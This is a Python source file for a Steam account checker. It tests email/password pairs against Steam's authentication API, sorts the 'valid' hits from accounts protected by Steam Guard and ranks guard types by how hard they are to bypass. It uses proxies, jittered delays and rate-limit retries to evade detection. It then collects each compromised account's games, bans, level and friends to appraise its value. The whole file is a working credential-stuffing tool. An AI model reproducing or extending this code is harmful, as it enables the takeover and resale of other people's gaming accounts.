# steam_checker.py
import os
import time
import random
import base64
import requests
from steam_auth_pb2 import (
    CAuthentication_GetPasswordRSAPublicKey_Request,
    CAuthentication_GetPasswordRSAPublicKey_Response,
    CAuthentication_BeginAuthSessionViaCredentials_Request,
    CAuthentication_BeginAuthSessionViaCredentials_Response
)

STEAM_API_KEY = os.getenv("STEAM_API_KEY")

def pkcs1pad2(data: str, keysize: int):
    """PKCS1 padding used by Steam"""
    if keysize < len(data) + 11:
        return None
    
    buffer = [0] * keysize
    i = len(data) - 1
    
    while i >= 0 and keysize > 0:
        keysize -= 1
        buffer[keysize] = ord(data[i])
        i -= 1
    
    keysize -= 1
    buffer[keysize] = 0
    
    while keysize > 2:
        keysize -= 1
        buffer[keysize] = int.from_bytes(os.urandom(1), 'big') % 254 + 1
    
    keysize -= 1
    buffer[keysize] = 2
    keysize -= 1
    buffer[keysize] = 0
    
    result = 0
    for byte in buffer:
        result = (result << 8) | byte
    return result

def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str | None:
    password = ''.join(char for char in password if ord(char) <= 127)
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    keysize = (n.bit_length() + 7) >> 3

    padded_data = pkcs1pad2(password, keysize)  # your existing function
    if not padded_data:
        return None

    encrypted_data = pow(padded_data, e, n)
    hex_str = hex(encrypted_data)[2:]
    if len(hex_str) % 2 == 1:
        hex_str = '0' + hex_str
    hex_bytes = bytes.fromhex(hex_str)
    return base64.b64encode(hex_bytes).decode('ascii')


def check_steam(username: str, password: str, proxy=None, _retry=0) -> dict:
    result = {
        'email': username,
        'password': password,
        'success': False,
        'profile_visibility': 'Unknown', 
        'message': '',
        'steamid': 'N/A',
        'twofa': False,
        'twofa_type': 'None',
        'profile_name': 'Unknown',
        'profile_url': '',
        'country': 'Unknown',
        'vac_banned': False,
        'community_banned': False,
        'trade_banned': False,
        'number_of_vac_bans': 0,
        'days_since_last_ban': 0,
        'steam_level': 0,
        'friends_count': 0,
        'recent_games': [],
        'limited': False,
        'games_count': 0,
        'total_playtime': 0,
        'games': []
    }

    try:
        session = requests.Session()
        time.sleep(random.uniform(0.5, 1.5)) 
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}

        # 1. Get RSA Key
        rsa_req = CAuthentication_GetPasswordRSAPublicKey_Request()
        rsa_req.account_name = username
        rsa_bytes = rsa_req.SerializeToString()
        rsa_base64 = base64.b64encode(rsa_bytes).decode("ascii")

        url_key = (
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=https%3A%2F%2Fstore.steampowered.com&input_protobuf_encoded={rsa_base64}"
        )

        resp = session.get(url_key, timeout=25)
        resp.raise_for_status()

        rsa_resp = CAuthentication_GetPasswordRSAPublicKey_Response()
        rsa_resp.ParseFromString(resp.content)

        modulus_hex = rsa_resp.publickey_mod.strip()
        exponent_hex = rsa_resp.publickey_exp.strip()
        timestamp = rsa_resp.timestamp

        # 2. Encrypt password
        encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
        if not encrypted_b64:
            result['message'] = "RSA encryption failed"
            return result

        # 3. Begin Auth Session (Modern Protobuf)
        auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
        auth_req.account_name = username
        auth_req.device_friendly_name = ""
        auth_req.encrypted_password = encrypted_b64
        auth_req.encryption_timestamp = timestamp
        auth_req.website_id = "Store"
        auth_req.platform_type = 2

        auth_bytes = auth_req.SerializeToString()
        auth_base64 = base64.b64encode(auth_bytes).decode("ascii")

        boundary = "----WebKitFormBoundaryuVO4LkJu0mV4BkLt"
        multipart_data = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="input_protobuf_encoded"\r\n\r\n'
            f"{auth_base64}\r\n"
            f"--{boundary}--\r\n"
        )

        headers = {
            "Host": "api.steampowered.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://store.steampowered.com",
            "Referer": "https://store.steampowered.com/",
        }

        url_auth = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1"
        resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)

        x_eresult = resp.headers.get('X-eresult', '')
        print(f"[DEBUG Steam] {username} | X-eresult: {x_eresult}")

        # ==================== FIXED 2FA DETECTION ====================
        is_twofa = False

        try:
            auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
            auth_resp.ParseFromString(resp.content)

            if hasattr(auth_resp, 'allowed_confirmations') and len(auth_resp.allowed_confirmations) > 0:
                confirmation_types = [c.confirmation_type for c in auth_resp.allowed_confirmations]
                
                if any(ct == 3 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Authenticator"   # hardest - needs TOTP app
                elif any(ct == 2 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Email Guard"     # easier - needs email access
                elif any(ct in [4, 5] for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Device Guard"
                # type 0 = No Guard, skip entirely (was your bug)
                
                print(f"[DEBUG Steam] Types: {confirmation_types} | 2FA: {is_twofa}")

            if hasattr(auth_resp, 'steamid') and auth_resp.steamid:
                result['steamid'] = str(auth_resp.steamid)

        except Exception as e:
            print(f"[DEBUG Steam] Protobuf parse failed: {e}")

        # ==================== FINAL DECISION ====================
        if is_twofa:
            result['twofa'] = True
            result['success'] = True
            result['message'] = "2FA Required"
        elif x_eresult in ['1', 'OK'] or len(resp.content) > 50:
            result['success'] = True
            result['message'] = "Valid Account"
        elif x_eresult == '5':
            result['message'] = "Invalid username or password"
            return result
        elif x_eresult == '6':
            result['message'] = "Account not found"
            return result
        elif x_eresult == '84':
            if _retry < 2:
                wait = (8 + _retry * 5) + random.uniform(2, 4)
                print(f"[Steam] Rate limited, retry {_retry+1}/2 in {wait:.1f}s...")
                time.sleep(wait)
                return check_steam(username, password, proxy, _retry=_retry+1)
            else:
                result['message'] = "Rate limited by Steam, try again later"
                return result
        elif x_eresult == '2':
            result['message'] = "Account disabled / banned"
            return result
        elif x_eresult == '15':
            result['message'] = "Account does not exist"
            return result
        else:
            result['message'] = f"Unknown error (eresult: {x_eresult})"
            return result

        # ==================== RICH DATA (Games, Country, etc.) ====================
        # Runs for BOTH normal hits AND 2FA accounts
        if result['steamid'] != 'N/A':
            try:
                # Player Summary
                summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                summary_resp = requests.get(summary_url, timeout=15)
                if summary_resp.status_code == 200:
                    players = summary_resp.json().get("response", {}).get("players", [])
                    if players:
                        data = players[0]
                        result['profile_name'] = data.get("personaname", "Unknown")
                        result['profile_url'] = data.get("profileurl", "")
                        country = data.get("loccountrycode", "").strip()
                        result['country'] = country if country else "Unknown"
                        visibility = data.get("communityvisibilitystate", 1)
                        result['profile_visibility'] = {1: "Private", 2: "Friends Only", 3: "Public"}.get(visibility, "Unknown")

                # --- VAC / Ban Info (VIP+) ---
                bans_url = f"https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                bans_resp = requests.get(bans_url, timeout=15)
                if bans_resp.status_code == 200:
                    players_bans = bans_resp.json().get("players", [])
                    if players_bans:
                        ban_data = players_bans[0]
                        result['vac_banned'] = ban_data.get("VACBanned", False)
                        result['community_banned'] = ban_data.get("CommunityBanned", False)
                        result['trade_banned'] = ban_data.get("EconomyBan", "none") != "none"
                        result['number_of_vac_bans'] = ban_data.get("NumberOfVACBans", 0)
                        result['days_since_last_ban'] = ban_data.get("DaysSinceLastBan", 0)

                # --- Steam Level (YEARLY) ---
                level_url = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key={STEAM_API_KEY}&steamid={result['steamid']}"
                level_resp = requests.get(level_url, timeout=15)
                if level_resp.status_code == 200:
                    result['steam_level'] = level_resp.json().get("response", {}).get("player_level", 0)

                # --- Friends Count (YEARLY) ---
                friends_url = f"https://api.steampowered.com/ISteamUser/GetFriendList/v1/?key={STEAM_API_KEY}&steamid={result['steamid']}&relationship=friend"
                friends_resp = requests.get(friends_url, timeout=15)
                if friends_resp.status_code == 200:
                    friends_list = friends_resp.json().get("friendslist", {}).get("friends", [])
                    result['friends_count'] = len(friends_list)

                # --- Recent Games (YEARLY) ---
                recent_url = f"https://api.steampowered.com/IPlayerService/GetRecentlyPlayedGames/v1/?key={STEAM_API_KEY}&steamid={result['steamid']}&count=5"
                recent_resp = requests.get(recent_url, timeout=15)
                if recent_resp.status_code == 200:
                    recent_games = recent_resp.json().get("response", {}).get("games", [])
                    result['recent_games'] = [
                        {
                            "name": g.get("name", "Unknown"),
                            "playtime_2weeks": g.get("playtime_2weeks", 0) // 60
                        }
                        for g in recent_games
                    ]

                # --- Owned Games ---
                games_count = 0
                games_list = []
                if STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
                    games_url = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key={STEAM_API_KEY}&steamid={result['steamid']}&format=json&include_appinfo=1"
                    games_resp = requests.get(games_url, timeout=15)
                    if games_resp.status_code == 200:
                        games_data = games_resp.json().get("response", {})
                        games_count = games_data.get("game_count", 0)
                        games_list = games_data.get("games", [])

                if games_count == 0:
                    community_url = f"https://steamcommunity.com/actions/GetOwnedGames?steamid={result['steamid']}&format=json&include_appinfo=1"
                    community_resp = requests.get(community_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
                    if community_resp.status_code == 200:
                        try:
                            comm_data = community_resp.json().get("response", {})
                            games_count = comm_data.get("game_count", 0)
                            games_list = comm_data.get("games", [])
                        except:
                            pass

                if games_list:
                    sorted_games = sorted(games_list, key=lambda x: x.get("playtime_forever", 0), reverse=True)
                    result['games_count'] = len(sorted_games)
                    result['total_playtime'] = sum(g.get("playtime_forever", 0) for g in sorted_games) // 60
                    result['games'] = [
                        {"name": g.get("name", "Unknown Game"), "playtime_hours": g.get("playtime_forever", 0) // 60}
                        for g in sorted_games
                    ]

            except Exception as e:
                print(f"[Steam] Extra data error: {e}")

    except Exception as e:
        result['message'] = f"Error: {str(e)[:80]}"

    return result












